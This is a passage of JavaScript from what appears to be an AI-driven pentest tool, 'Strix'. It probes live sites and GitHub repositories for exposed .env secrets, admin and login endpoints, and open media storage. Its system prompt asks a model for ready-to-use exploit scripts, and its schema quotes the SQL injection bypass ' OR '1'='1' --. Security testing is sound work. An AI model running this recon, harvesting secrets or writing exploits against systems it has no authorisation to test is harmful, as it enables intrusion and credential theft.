  const pathsToProbe = [...COMMON_SENSITIVE_PATHS];

  // Add dynamically discovered admin endpoints
  for (const adm of htmlExtracted.adminEndpoints) {
    if (!pathsToProbe.some(p => p.path === adm)) {
      pathsToProbe.push({ path: adm, desc: `Discovered Admin Interface (${adm})` });
    }
  }

  // Add dynamically discovered login endpoints
  for (const log of htmlExtracted.loginEndpoints) {
    if (!pathsToProbe.some(p => p.path === log)) {
      pathsToProbe.push({ path: log, desc: `Discovered Authentication Portal (${log})` });
    }
  }

  const baseUrl = new URL(normalizedUrl).origin;

  // Concurrently probe paths
  for (const item of pathsToProbe) {
    try {
      const probeController = new AbortController();
      const pTimeout = setTimeout(() => probeController.abort(), 4500);
      const probeUrl = `${baseUrl}${item.path}`;

      const probeRes = await resilientFetch(probeUrl, {
        method: 'GET',
        headers: { 'User-Agent': 'Strix-Pentest/2.0' },
        signal: probeController.signal,
        redirect: 'manual', // do not auto follow redirects so we detect 302 to login
      });
      clearTimeout(pTimeout);

      const status = probeRes.status;
      const accessible = status >= 200 && status < 300;
      let note = item.desc;

      // SPECIFIC HANDLING FOR .ENV FILES
      if (item.path.includes('.env') && accessible) {
        try {
          const envText = await probeRes.text();
          // Verify it's actually an env file (has KEY=VALUE format)
          if (/[A-Z0-9_]+\s*=\s*.+/m.test(envText)) {
            const parsedEnv = parseEnvContent(envText, item.path);
            reconData.envEndpoints.push(...parsedEnv);
            note = `CRITICAL LEAK: .env file accessible (${parsedEnv.length} endpoints/secrets extracted)!`;
            reconData.exposedRisks.push(`Publicly readable ${item.path} file leaking ${parsedEnv.length} service URLs and configuration secrets (CWE-200, CWE-798)`);
          } else {
            note = `Endpoint returned HTTP ${status} (No valid .env formatting detected)`;
          }
        } catch {
          note = `Accessible with HTTP ${status}`;
        }
      }

      // SPECIFIC HANDLING FOR ADMIN ENDPOINTS
      const isAdminPath = /(admin|administrator|cpanel|dashboard|manage|backend)/i.test(item.path);
      if (isAdminPath) {
        let isExposedWithoutAuth = false;
        if (accessible) {
          isExposedWithoutAuth = true;
          note = `EXPOSED ADMIN: ${item.path} returned HTTP 200 without authentication requirement!`;
          reconData.exposedRisks.push(`Unprotected Admin Interface at ${item.path} returned HTTP 200 (Broken Access Control - A01:2025)`);
        } else if (status === 401 || status === 403) {
          note = `Admin portal detected at ${item.path} (Properly protected with HTTP ${status}).`;
        } else if (status === 301 || status === 302 || status === 307 || status === 308) {
          const loc = probeRes.headers.get('location') || '';
          note = `Admin portal redirects (HTTP ${status} -> ${loc}).`;
        }

        reconData.adminEndpoints.push({
          path: item.path,
          status,
          accessible: isExposedWithoutAuth,
          note,
        });
      }

      // SPECIFIC HANDLING FOR LOGIN ENDPOINTS
      const isLoginPath = /(login|signin|sign-in|auth|session|signup)/i.test(item.path);
      if (isLoginPath) {
        reconData.loginEndpoints.push({
          path: item.path,
          status,
          accessible,
          method: 'POST',
          note: accessible ? `Active authentication portal discovered at ${item.path}` : `Status HTTP ${status}`,
        });
      }

      reconData.probedEndpoints.push({
        path: item.path,
        status,
        accessible,
        title: item.desc,
        note,
      });

    } catch {
      reconData.probedEndpoints.push({
        path: item.path,
        status: 0,
        accessible: false,
        title: item.desc,
        note: 'Connection timed out or host refused connection.',
      });
    }
  }

  // 4. Burp-style Request Interception, Intruder Payload Fuzzing, & Auth Bypass Analysis
  for (const logEndpoint of reconData.loginEndpoints.slice(0, 2)) {
    try {
      const fuzzDiagnosis = await fuzzLoginSecurity(baseUrl, logEndpoint.path, htmlBody);
      Object.assign(logEndpoint, fuzzDiagnosis);

      if (fuzzDiagnosis.fuzzResult === 'BYPASS_DETECTED') {
        reconData.exposedRisks.push(`CRITICAL: SQL Injection Authentication Bypass confirmed on ${logEndpoint.path}! Server returned success on tautological payload.`);
      } else if (fuzzDiagnosis.fuzzResult === 'SQL_ERROR_LEAK') {
        reconData.exposedRisks.push(`SQL Error Leakage: ${logEndpoint.path} returned unhandled database syntax error in response.`);
      }

      if (!fuzzDiagnosis.rateLimitDetected) {
        reconData.exposedRisks.push(`Missing Rate Limiting on ${logEndpoint.path}: susceptible to automated password brute-force and Burp Intruder attacks.`);
      }
      if (!fuzzDiagnosis.hasCsrf) {
        reconData.exposedRisks.push(`Missing Anti-CSRF Token: Login form on ${logEndpoint.path} does not declare CSRF protection.`);
      }
    } catch {
      // Continue if fuzzing request fails
    }
  }

  // 5. Encrypted Media & Storage Audit
  const mediaEncryption = {
    testedPaths: [],
    leakedMedia: [],
    status: 'SECURE', // 'LEAK_DETECTED' | 'WEAK_CIPHER' | 'SECURE'
    evidence: '',
  };

  const MEDIA_PATHS = [
    { path: '/storage', desc: 'Object Storage Root' },
    { path: '/media', desc: 'Media Asset Directory' },
    { path: '/uploads', desc: 'User Upload Directory' },
    { path: '/files', desc: 'Files Directory' },
    { path: '/api/media', desc: 'Media API Endpoint' },
    { path: '/api/files', desc: 'File Management API' },
    { path: '/storage/encrypted', desc: 'Encrypted Media Vault' },
  ];

  for (const mItem of MEDIA_PATHS) {
    mediaEncryption.testedPaths.push(mItem.path);
    try {
      const mController = new AbortController();
      const mTimeout = setTimeout(() => mController.abort(), 3500);
      const mRes = await resilientFetch(`${normalizedUrl}${mItem.path}`, {
        method: 'GET',
        headers: { 'User-Agent': 'Strix-Pentest/2.0 (Media Encryption Probe)' },
        signal: mController.signal,
        redirect: 'manual',
      });
      clearTimeout(mTimeout);

      if (mRes.status === 200) {
        const mText = await mRes.text().catch(() => '');
        const contentType = (mRes.headers.get('content-type') || '').toLowerCase();
        const isDirectoryListing = mText.includes('Index of /') || mText.includes('Directory listing') || mText.includes('<pre>');
        const isJsonFiles = contentType.includes('json') && (mText.includes('filename') || mText.includes('files') || mText.includes('url'));
        const isRawMedia = contentType.startsWith('image/') || contentType.startsWith('video/') || contentType.startsWith('audio/') || contentType.includes('pdf');

        if (isDirectoryListing || isJsonFiles || isRawMedia) {
          mediaEncryption.leakedMedia.push({
            path: mItem.path,
            status: mRes.status,
            issue: isDirectoryListing ? 'Directory Listing Enabled' : 'Unauthenticated Media Access',
            evidence: `Endpoint returned HTTP 200 with Content-Type '${contentType}' without requiring authentication tokens or encryption verification.`,
          });
        }
      }
    } catch {
      // Continue
    }
  }

  // Check if .env exposed any encryption keys or media secrets
  const exposedCryptoKeys = (reconData.envEndpoints || []).filter(e => 
    /(ENCRYPT|CRYPTO|CIPHER|AES|SECRET_KEY|MEDIA_KEY|SALT|PRIVATE_KEY|STORAGE_KEY)/i.test(e.key)
  );

  if (exposedCryptoKeys.length > 0) {
    mediaEncryption.status = 'LEAK_DETECTED';
    mediaEncryption.evidence = `CRITICAL: Cryptographic encryption keys were exposed in environment configuration (${exposedCryptoKeys.map(k => k.key).join(', ')}). Any media encrypted with these keys can be decrypted in plaintext by unauthorized parties.`;
    reconData.exposedRisks.push(`Cryptographic Key Leak: Exposed ${exposedCryptoKeys.map(k => k.key).join(', ')} compromises all encrypted media.`);
  } else if (mediaEncryption.leakedMedia.length > 0) {
    mediaEncryption.status = 'LEAK_DETECTED';
    mediaEncryption.evidence = `Unauthenticated media storage access detected on: ${mediaEncryption.leakedMedia.map(m => m.path).join(', ')}. Media files are accessible directly without encryption verification.`;
    reconData.exposedRisks.push(`Unprotected Media Storage: Direct unauthenticated download accessible at ${mediaEncryption.leakedMedia[0].path}`);
  } else {
    mediaEncryption.status = 'SECURE';
    mediaEncryption.evidence = 'Media storage endpoints are restricted or require authentication headers. No plaintext encryption key leakage detected.';
  }

  reconData.mediaEncryption = mediaEncryption;

  // 6. Deep Headless Browser (Puppeteer) Audit with Rotating IP Proxy & Fallbacks
  try {
    if (onProgress) {
      onProgress({ phase: 'recon', message: 'Launching Puppeteer headless browser with rotating IP proxy for WebRTC & media DOM audit...', progress: 32 });
    }
    const puppeteerResult = await auditWithPuppeteer(normalizedUrl);
    reconData.puppeteerAudit = puppeteerResult;

    // Check if WebRTC leaked any computer/client IPs
    if (puppeteerResult.webrtcLeakedIps?.length > 0) {
      for (const leakIp of puppeteerResult.webrtcLeakedIps) {
        reconData.ipExposure.originIpLeaked = true;
        const leakDesc = `WebRTC RTCPeerConnection STUN leak: Disclosed client/computer IP: ${leakIp}`;
        if (!reconData.ipExposure.leakVectors.includes(leakDesc)) {
          reconData.ipExposure.leakVectors.push(leakDesc);
        }
      }
      reconData.ipExposure.evidence = `WebRTC STUN candidate leak detected via Puppeteer browser execution. Computer IP (${puppeteerResult.webrtcLeakedIps.join(', ')}) is exposed to browser scripts.`;
      reconData.exposedRisks.push(`WebRTC IP Leak: Client/Host IP ${puppeteerResult.webrtcLeakedIps[0]} exposed via RTCPeerConnection STUN candidate.`);
    }

    // Check if DOM media was discovered
    if (puppeteerResult.domMediaDiscovered?.length > 0) {
      for (const mUrl of puppeteerResult.domMediaDiscovered) {
        if (!mediaEncryption.leakedMedia.some(m => m.path === mUrl)) {
          mediaEncryption.leakedMedia.push({
            path: mUrl,
            status: 200,
            issue: 'Client DOM Rendered Media Asset',
            evidence: `Discovered active media asset in rendered DOM or network stream: ${mUrl}`,
          });
        }
      }
    }

    // Check if client storage (localStorage / sessionStorage) leaked secrets or encryption keys
    if (puppeteerResult.clientStorageSecrets?.length > 0) {
      mediaEncryption.status = 'LEAK_DETECTED';
      mediaEncryption.evidence += ` Client-side storage disclosed sensitive cryptographic keys/tokens: ${puppeteerResult.clientStorageSecrets.join('; ')}.`;
      reconData.exposedRisks.push(`Client Storage Key Leak: ${puppeteerResult.clientStorageSecrets[0]}`);
    }

  } catch (pupErr) {
    console.warn(`[Strix Engine] Puppeteer audit bypassed with error: ${pupErr.message}. Fallback to native scan succeeded.`);
    reconData.puppeteerAudit = {
      executed: false,
      proxyUsed: 'Direct',
      fallbackTriggered: true,
      webrtcLeakedIps: [],
      domMediaDiscovered: [],
      clientStorageSecrets: [],
      screenshotProof: '',
      note: `Puppeteer headless audit gracefully bypassed (${pupErr.message}). Standard HTTP probe completed.`,
    };
  }

  return reconData;
}

/**
 * Perform white-box code and architecture reconnaissance on a GitHub repository.
 */
export async function probeRepoTarget(repoUrl, githubToken) {
  const { owner, repo, branch: customBranch } = parseGitHubUrl(repoUrl);
  const repoMeta = await fetchRepoMetadata(owner, repo, githubToken);
  const targetBranch = customBranch || repoMeta.defaultBranch || 'main';

  const treeResult = await fetchRepoTree(owner, repo, targetBranch, githubToken);
  const formattedTree = formatTreeStructure(treeResult.items);

  const [readmeText, keyFiles] = await Promise.all([
    fetchRepoReadme(owner, repo, targetBranch, githubToken),
    fetchKeyFilesContent(owner, repo, targetBranch, treeResult.items, githubToken),
  ]);

  const sensitiveFilesFound = [];
  const manifestFiles = [];
  const envEndpoints = [];
  const adminEndpoints = [];
  const loginEndpoints = [];

  // 1. Search tree items for .env files and extract endpoints
  const envFilesToFetch = [];
  for (const item of treeResult.items) {
    const p = item.path.toLowerCase();
    const fileName = item.path.split('/').pop().toLowerCase();

    // Look for .env files
    if (fileName === '.env' || fileName.startsWith('.env.') || fileName === 'env.example') {
      sensitiveFilesFound.push(`Environment file in repository: ${item.path}`);
      envFilesToFetch.push(item.path);
    }

    // Look for private keys
    if (p.endsWith('.pem') || p.endsWith('.key') || p.includes('id_rsa')) {
      sensitiveFilesFound.push(`Potential private key file in repository: ${item.path}`);
    }

    // Look for dependency manifests
    if (['package.json', 'requirements.txt', 'pom.xml', 'gemfile', 'go.mod', 'composer.json'].includes(fileName)) {
      manifestFiles.push(item.path);
    }

    // Detect Admin routes in source tree
    if (/(^|\/)admin(\/|\.|$)/i.test(item.path) || /(adminController|adminRouter|routes\/admin)/i.test(item.path)) {
      adminEndpoints.push({
        path: item.path,
        status: 200,
        accessible: true,
        note: `Admin route definition found in codebase: ${item.path}`,
      });
    }

    // Detect Login / Auth routes in source tree
    if (/(^|\/)(login|signin|auth)(\/|\.|$)/i.test(item.path) || /(authController|authRouter|routes\/auth)/i.test(item.path)) {
      loginEndpoints.push({
        path: item.path,
        status: 200,
        accessible: true,
        method: 'POST',
        note: `Authentication route definition found in codebase: ${item.path}`,
      });
    }
  }

  // 2. Fetch and parse contents of discovered .env files
  for (const envPath of envFilesToFetch.slice(0, 4)) {
    try {
      const rawEnvUrl = `https://raw.githubusercontent.com/${owner}/${repo}/${targetBranch}/${envPath}`;
      const envRes = await fetch(rawEnvUrl, {
        headers: githubToken ? { Authorization: `token ${githubToken}` } : {},
      });
      if (envRes.ok) {
        const envContent = await envRes.text();
        const parsed = parseEnvContent(envContent, envPath);
        envEndpoints.push(...parsed);
      }
    } catch {
      // Continue if fetch fails
    }
  }

  return {
    repoInfo: repoMeta,
    targetBranch,
    fileTree: formattedTree,
    readmeText,
    keyFiles,
    sensitiveFilesFound,
    manifestFiles,
    envEndpoints,
    adminEndpoints,
    loginEndpoints,
    totalFiles: treeResult.items.length,
  };
}

/**
 * Builds the comprehensive Strix autonomous pentest prompt adhering to OWASP Top 10:2025.
 */
function buildStrixSystemPrompt() {
  return `You are STRIX — the Autonomous AI Penetration Testing & Vulnerability Research Engine.
You operate with the mindset of an elite ethical hacker and Principal Application Security Researcher.
Your mission is to perform an exhaustive, evidence-backed penetration test against the provided target.

### CORE OPERATIONAL DIRECTIVES:
1. FOCUS ON REAL, ACTIONABLE VULNERABILITIES: Never report vague, theoretical issues. Report only flaws that have verifiable attack vectors, impact, and a reproducible Proof-of-Concept (PoC).
2. SPECIAL ATTENTION TO DISCOVERED .ENV ENDPOINTS & SECRETS:
   - If endpoints, database strings (MongoDB, PostgreSQL, Redis), or service URLs were discovered from .env files, analyze their exposure, credential strength, and SSRF risk.
   - If an exposed .env is present on a live server, report it as a Critical Information Disclosure (CWE-200 / CWE-798).
3. SPECIAL ATTENTION TO /ADMIN & AUTHENTICATION/LOGIN ENDPOINTS:
   - Analyze any discovered /admin or administrator endpoints for Broken Access Control (A01:2025), missing authentication guards, IDOR, or privilege escalation.
   - Analyze any login endpoints for Authentication Failures (A07:2025), SQL injection in auth parameters, credential stuffing susceptibility, and lack of CSRF tokens.
4. USE THE OWASP TOP 10:2025 STANDARD:
   - A01:2025 Broken Access Control (including SSRF, IDOR, Privilege Escalation, Path Traversal)
   - A02:2025 Security Misconfiguration (Permissive CORS, missing security headers, exposed debug endpoints, default credentials)
   - A03:2025 Software Supply Chain Failures (Outdated/vulnerable dependencies, unpinned components, malicious packages)
   - A04:2025 Cryptographic Failures (Weak TLS, cleartext secrets, hardcoded API keys, broken JWT signatures)
   - A05:2025 Injection (SQLi, NoSQLi, Command Injection, Template Injection / SSTI, XSS)
   - A06:2025 Insecure Design (Business logic flaws, lack of rate limiting, workflow bypass)
   - A07:2025 Authentication Failures (Auth bypass, brute-force susceptibility, missing MFA, session hijacking)
   - A08:2025 Software or Data Integrity Failures (Insecure deserialization, untrusted CDN scripts without SRI)
   - A09:2025 Security Logging & Alerting Failures
   - A10:2025 Mishandling of Exceptional Conditions (Fail-open behavior, stack trace disclosure in responses)
5. GENERATE COMPLETE, READY-TO-USE PROOF-OF-CONCEPT (PoC) CODE:
   - For every critical/high/medium vulnerability, produce a realistic exploit script (Python requests or curl commands) demonstrating how an attacker exploits the vulnerability.
6. PROVIDE PRECISE REMEDIATION & CODE PATCHES:
   - Show the exact code diff or replacement snippet that completely eliminates the vulnerability.
7. CVSS v3.1 SCORING:
   - Provide an accurate CVSS base score (0.0 to 10.0) reflecting real-world exploitability and impact.
8. HIGH-DETAIL DEVELOPER DEBUGGING, BYPASS MECHANICS & DATA LEAKAGE:
   - For every finding, you MUST provide extensive developer guidance:
     - dataLeakage: List the specific types of data exposed (e.g., Passwords, JWT Tokens, Database Records, PII) and a realistic formatted sample (JSON, ENV, or SQL dump) showing the exact leaked structure so developers see the tangible threat.
     - debuggingInfo: Root cause trigger (exact parameter, header, or query key), step-by-step execution flow through the application stack, and server error/exception signatures.
     - bypassDetails: How the authentication/security control was bypassed (tautology, type juggling, missing guard), list of bypassed security layers, and conceptual attack vector.
     - developerGuidance: Step-by-step developer remediation checklist.

OUTPUT FORMAT:
You MUST output ONLY a valid JSON object matching the exact JSON schema below. Do not wrap in markdown or backticks.`;
}

function buildStrixUserPrompt({ targetType, target, reconData, repoData, codeSnippet, instruction, scanMode }) {
  let contextText = `TARGET CLASSIFICATION: ${targetType.toUpperCase()}\nTARGET IDENTIFIER: ${target}\nSCAN MODE: ${scanMode.toUpperCase()}\n`;

  if (instruction) {
    contextText += `USER INSTRUCTION & FOCUS: "${instruction}"\n`;
  }

  if (targetType === 'url' && reconData) {
    contextText += `
---
### LIVE TARGET RECONNAISSANCE & ACTIVE PROBE RESULTS:
- Target URL: ${reconData.url}
- HTTP Status: ${reconData.statusCode || 'N/A'}
- Detected Server Banner: ${reconData.server}
- Identified Technologies: ${reconData.technologies.join(', ') || 'Standard Web Stack'}
- Response Headers:
\`\`\`json
${JSON.stringify(reconData.headers, null, 2)}
\`\`\`
- Missing Essential Security Headers: ${reconData.missingSecurityHeaders.join(', ') || 'None'}
- Exposed Risks / Misconfigurations Detected:
${reconData.exposedRisks.map(r => `  * ${r}`).join('\n') || '  * None detected in surface probe'}

### DISCOVERED .ENV ENDPOINTS & CONFIGURATIONS:
${reconData.envEndpoints?.length > 0 
  ? reconData.envEndpoints.map(e => `  * [${e.type}] ${e.key} = ${e.value} (from ${e.source})`).join('\n')
  : '  * No public .env endpoints detected in initial probe'}

### DISCOVERED ADMIN & MANAGEMENT ENDPOINTS (/admin):
${reconData.adminEndpoints?.length > 0 
  ? reconData.adminEndpoints.map(a => `  * ${a.path} -> Status ${a.status} (${a.note})`).join('\n')
  : '  * No custom admin portals discovered'}

### DISCOVERED LOGIN & AUTHENTICATION ENDPOINTS (WITH BURP-STYLE PARAMETER INTERCEPTION & FUZZING):
${reconData.loginEndpoints?.length > 0 
  ? reconData.loginEndpoints.map(l => `  * [${l.method}] ${l.path} -> Status ${l.status} | Intercepted Fields: [${(l.fields || []).join(', ')}] | CSRF: ${l.hasCsrf ? 'PROTECTED' : 'MISSING'} | Rate-Limiting: ${l.rateLimitDetected ? 'ENFORCED' : 'ABSENT (Burp Intruder Vulnerable)'} | SQLi Fuzz Result: ${l.fuzzResult || 'N/A'}`).join('\n')
  : '  * Standard login endpoints'}

### ORIGIN & IP ADDRESS EXPOSURE DIAGNOSTIC:
- Detected Server/Host IP: ${reconData.ipExposure?.detectedServerIp || 'N/A'}
- Proxy / CDN Protection: ${reconData.ipExposure?.proxyProvider || 'None'} (Shielded: ${reconData.ipExposure?.isBehindProxy ? 'YES' : 'NO'})
- Origin IP Leaked: ${reconData.ipExposure?.originIpLeaked ? 'YES - LEAK DETECTED' : 'NO'}
- Disclosed Leak Vectors: ${reconData.ipExposure?.leakVectors?.join('; ') || 'None'}
- Technical Proof & Evidence: ${reconData.ipExposure?.evidence || 'N/A'}

### ENCRYPTED MEDIA & STORAGE AUDIT:
- Storage Encryption Status: ${reconData.mediaEncryption?.status || 'N/A'}
- Tested Media & Storage Paths: ${(reconData.mediaEncryption?.testedPaths || []).join(', ')}
- Unprotected / Leaked Media Endpoints: ${(reconData.mediaEncryption?.leakedMedia || []).map(m => `${m.path} (${m.issue})`).join(', ') || 'None'}
- Cryptographic Proof & Evidence: ${reconData.mediaEncryption?.evidence || 'N/A'}

- All Probed Security Endpoints:
${reconData.probedEndpoints.map(p => `  * ${p.path} -> Status ${p.status} (${p.note})`).join('\n')}
`;
  } else if (targetType === 'repo' && repoData) {
    contextText += `
---
### REPOSITORY METADATA & CODE ANALYSIS:
- Repository: ${repoData.repoInfo.fullName}
- Description: ${repoData.repoInfo.description || 'N/A'}
- Primary Language: ${repoData.repoInfo.language || 'Unknown'}
- Default Branch: ${repoData.targetBranch}

### EXTRACTED .ENV ENDPOINTS & SECRETS FROM REPOSITORY:
${repoData.envEndpoints?.length > 0 
  ? repoData.envEndpoints.map(e => `  * [${e.type}] ${e.key} = ${e.value} (from ${e.source})`).join('\n')
  : '  * No .env files extracted'}

### DISCOVERED ADMIN ROUTES IN CODEBASE:
${repoData.adminEndpoints?.length > 0 
  ? repoData.adminEndpoints.map(a => `  * ${a.path} (${a.note})`).join('\n')
  : '  * No explicit admin routes in file tree'}

### DISCOVERED LOGIN / AUTH ROUTES IN CODEBASE:
${repoData.loginEndpoints?.length > 0 
  ? repoData.loginEndpoints.map(l => `  * ${l.path} (${l.note})`).join('\n')
  : '  * No explicit login routes in file tree'}

- Identified Sensitive Files:
${repoData.sensitiveFilesFound.map(s => `  * ${s}`).join('\n') || '  * None discovered in root file tree'}
- Manifest & Dependency Files: ${repoData.manifestFiles.join(', ') || 'None found'}

### REPOSITORY FILE TREE:
\`\`\`
${repoData.fileTree}
\`\`\`

### README EXCERPT:
\`\`\`markdown
${repoData.readmeText || 'No README file present'}
\`\`\`

### KEY SOURCE CODE EXCERPTS:
`;
    for (const f of (repoData.keyFiles || [])) {
      contextText += `
#### File: ${f.path}
\`\`\`
${f.content}
\`\`\`
`;
    }
  } else if (targetType === 'code' && codeSnippet) {
    contextText += `
---
### RAW CODE & SPECIFICATION TARGET FOR AUDIT:
\`\`\`
${codeSnippet}
\`\`\`
`;
    if (reconData?.envEndpoints?.length > 0) {
      contextText += `
### PARSED .ENV ENDPOINTS & SECRETS FROM CODE SNIPPET:
${reconData.envEndpoints.map(e => `  * [${e.type}] ${e.key} = ${e.value}`).join('\n')}
`;
    }
    if (reconData?.adminEndpoints?.length > 0) {
      contextText += `
### DETECTED ADMIN ROUTES IN SNIPPET:
${reconData.adminEndpoints.map(a => `  * ${a.path}`).join('\n')}
`;
    }
  }

  contextText += `
---
### REQUIRED JSON RESPONSE STRUCTURE:
Return a valid JSON object with the following schema:
{
  "executiveSummary": "A concise executive briefing (2-3 paragraphs) detailing overall security posture, key vulnerabilities discovered (specifically mentioning .env exposures, /admin access status, and login security if applicable), root causes, and business risk impact.",
  "riskScore": 75, // Integer 0-100 indicating risk severity
  "riskRating": "CRITICAL", // One of: "CRITICAL", "HIGH", "MEDIUM", "LOW", "SECURE"
  "vulnerabilities": [
    {
      "id": "STRIX-2026-001",
      "title": "Precise Vulnerability Title",
      "severity": "critical", // "critical" | "high" | "medium" | "low" | "info"
      "owaspCategory": "A01:2025 Broken Access Control",
      "cwe": "CWE-89: Improper Neutralization of Special Elements used in an SQL Command",
      "cve": "CVE-2024-XXXX or N/A",
      "cvss": 9.8,
      "cvssVector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
      "confidence": "high", // "high" | "medium" | "low"
      "fixEffort": "medium", // "low" | "medium" | "high"
      "endpoint": "/api/v1/auth/login",
      "method": "POST",
      "target": "${target}",
      "description": "Clear explanation of how the vulnerability exists.",
      "evidence": "Concrete evidence (e.g., exposed header, missing check, unescaped parameter).",
      "impact": "What an attacker can achieve (e.g., full database dump, unauthorized privilege escalation).",
      "technicalAnalysis": "In-depth root cause analysis explaining the vulnerable code or missing control.",
      "pocDescription": "Step-by-step reproduction guide for the exploit.",
      "pocScriptCode": "#!/usr/bin/env python3\\nimport requests\\n... Complete working exploit script or curl command ...",
      "codeLocations": [
        {
          "file": "path/to/vulnerable/file.js",
          "startLine": 45,
          "endLine": 52,
          "snippet": "const query = 'SELECT * FROM users WHERE id = ' + userId;"
        }
      ],
      "remediation": "Clear, actionable step-by-step guidance on how to fix this issue.",
      "remediationPatch": "// Replace with parameterized query:\\nconst query = 'SELECT * FROM users WHERE id = $1';",
      "references": [
        "https://owasp.org/Top10/A01_2025-Broken_Access_Control/",
        "https://cwe.mitre.org/data/definitions/89.html"
      ],
      "dataLeakage": {
        "leakedTypes": [
          "User Passwords & Bcrypt Hashes",
          "Session JWT / Bearer Tokens",
          "Personally Identifiable Information (Full Name, NIK, Phone, Email)",
          "Internal Database Schema & Sensitive Tables"
        ],
        "exposedSample": "{\\n  \"users\": [\\n    {\\n      \"id\": 1,\\n      \"username\": \"administrator\",\\n      \"email\": \"admin@target.domain\",\\n      \"password_hash\": \"$2y$12$K1dJ83kJ2...\",\\n      \"role\": \"SUPER_ADMIN\",\\n      \"api_key\": \"sk_live_9f82...\"\\n    }\\n  ]\\n}",
        "impactDescription": "Exposes core customer data, encrypted password hashes, and active authentication bearer tokens, allowing total account takeover."
      },
      "debuggingInfo": {
        "rootCauseTrigger": "Parameter 'email' submitted via POST /login is directly concatenated into SQL query without sanitation or prepared statement.",
        "executionFlow": [
          "1. HTTP Client sends POST /login with payload in 'email' field",
          "2. Application route handler reads req.body.email without type or character sanitization",
          "3. Backend database executes query with tautology condition (1=1)",
          "4. Database returns first matched row without evaluating password check",
          "5. Server issues session cookie granting administrative privileges"
        ],
        "serverErrorSignature": "SQLSTATE[42000]: Syntax error or access violation (or unhandled 500 error leak)"
      },
      "bypassDetails": {
        "mechanism": "Tautological logic bypass: Injection of ' OR '1'='1' -- causes the boolean evaluation in WHERE clause to permanently resolve to TRUE, completely skipping password validation.",
        "bypassedControls": [
          "Password Hash Comparison Routine",
          "Input Validation / Parameter Sanitization",
          "Web Application Firewall (WAF) Rule Set",
          "Authentication Middleware Gate"
        ],
        "attackVector": "' OR '1'='1' --"
      },
      "developerGuidance": {
        "checklist": [
          "Replace string concatenation with parameterized queries or prepared statements ($1, $2)",
          "Implement server-side input schema validation (e.g. using Zod or Joi)",
          "Enforce rate-limiting on authentication endpoints (e.g. maximum 5 attempts per IP per minute)",
          "Add CSRF token validation to prevent cross-site request forgery attacks"
        ]
      }
    }
  ]
}`;

  return contextText;
}

/**
 * Generates an OASIS SARIF 2.1.0 standard report from scan results.
 */
export function generateSarifReport(scanData) {
  const rules = [];
  const results = [];
  const ruleIdsSeen = new Set();

  for (const vuln of (scanData.vulnerabilities || [])) {
    const ruleId = vuln.cwe?.split(':')[0]?.trim() || vuln.id;
    if (!ruleIdsSeen.has(ruleId)) {
      ruleIdsSeen.add(ruleId);
      rules.push({
        id: ruleId,
        name: vuln.title,
        shortDescription: { text: vuln.title },
        fullDescription: { text: vuln.description || vuln.title },
        helpUri: (vuln.references && vuln.references[0]) || 'https://docs.strix.ai',
        defaultConfiguration: {
          level: vuln.severity === 'critical' || vuln.severity === 'high' ? 'error' : (vuln.severity === 'medium' ? 'warning' : 'note')
        },
        properties: {
          tags: ['security', 'pentest', vuln.owaspCategory || 'OWASP-Top-10'],
          cvss: vuln.cvss,
          cwe: vuln.cwe,
        }
      });
    }

    const firstLoc = vuln.codeLocations && vuln.codeLocations[0];
    results.push({
      ruleId,
      level: vuln.severity === 'critical' || vuln.severity === 'high' ? 'error' : (vuln.severity === 'medium' ? 'warning' : 'note'),
      message: {
        text: `[${vuln.severity.toUpperCase()}] ${vuln.title}: ${vuln.description}`
      },
      locations: [
        {
          physicalLocation: {
            artifactLocation: {
              uri: firstLoc?.file || vuln.endpoint || scanData.target || 'target'
            },
            region: {
              startLine: firstLoc?.startLine || 1,
              endLine: firstLoc?.endLine || firstLoc?.startLine || 1,
              snippet: {
                text: firstLoc?.snippet || vuln.evidence || ''
              }
            }
          }
        }
      ],
      properties: {
        severity: vuln.severity,
        cvss: vuln.cvss,
        poc: vuln.pocScriptCode || '',
        remediation: vuln.remediation || '',
      }
    });
  }

  return {
    version: '2.1.0',
    $schema: 'https://json.schemastore.org/sarif-2.1.0.json',
    runs: [
      {
        tool: {
          driver: {
            name: 'Strix Autonomous AI Pentester',
            version: '2.0.0',
            informationUri: 'https://strix.ai',
            rules,
          }
        },
        results,
      }
    ]
  };
}

/**
 * Calculate refined Risk Score and Rating based on discovered findings.
 */
export function calculateRiskSummary(vulnerabilities, recon) {
  let critical = 0;
  let high = 0;
  let medium = 0;
  let low = 0;
  let info = 0;

  for (const v of vulnerabilities) {
    const sev = (v.severity || 'low').toLowerCase();
    if (sev === 'critical') critical++;
    else if (sev === 'high') high++;
    else if (sev === 'medium') medium++;
    else if (sev === 'low') low++;
    else info++;
  }

  let calculatedScore = (critical * 30) + (high * 15) + (medium * 7) + (low * 2) + (info * 0.5);
  
  if (recon?.missingSecurityHeaders?.length > 2) {
    calculatedScore += 5;
  }
  if (recon?.exposedRisks?.length > 0) {
    calculatedScore += Math.min(recon.exposedRisks.length * 4, 15);
  }
  if (recon?.envEndpoints?.length > 0) {
    calculatedScore += 15; // .env exposed is critical
  }
  if (recon?.adminEndpoints?.some(a => a.accessible)) {
    calculatedScore += 20; // /admin open is critical
  }

  const riskScore = Math.min(Math.max(Math.round(calculatedScore), 0), 100);

  let riskRating = 'SECURE';
  if (critical > 0 || riskScore >= 75) riskRating = 'CRITICAL';
  else if (high > 0 || riskScore >= 50) riskRating = 'HIGH';
  else if (medium > 0 || riskScore >= 25) riskRating = 'MEDIUM';
  else if (low > 0 || riskScore > 0) riskRating = 'LOW';

  return {
    totalVulnerabilities: vulnerabilities.length,
    critical,
    high,
    medium,
    low,
    info,
    riskScore,
    riskRating,
  };
}

/**
 * Main Orchestrator: Runs the full multi-phase pentest.
 */
export async function runStrixPentest({
  targetType, // 'url' | 'repo' | 'code'
  target,
  codeSnippet = '',
  scanMode = 'standard',
  instruction = '',
  groqApiKey = '',
  githubToken = '',
  onProgress = () => {},
}) {
  onProgress({ phase: 'recon', message: `Initializing Strix AI Pentest for ${targetType}: ${target}...`, progress: 10 });

  let reconData = null;
  let repoData = null;

  // Phase 1: Target Reconnaissance
  if (targetType === 'url') {
    onProgress({ phase: 'recon', message: 'Probing live target: checking headers, CORS, TLS, and probing sensitive endpoints...', progress: 20 });
    reconData = await probeWebTarget(target, { onProgress });

    // Report discovery stats
    if (reconData.envEndpoints?.length > 0) {
      onProgress({ phase: 'recon', message: `Found exposed .env with ${reconData.envEndpoints.length} configuration endpoints!`, progress: 30 });
    }
    if (reconData.adminEndpoints?.length > 0) {
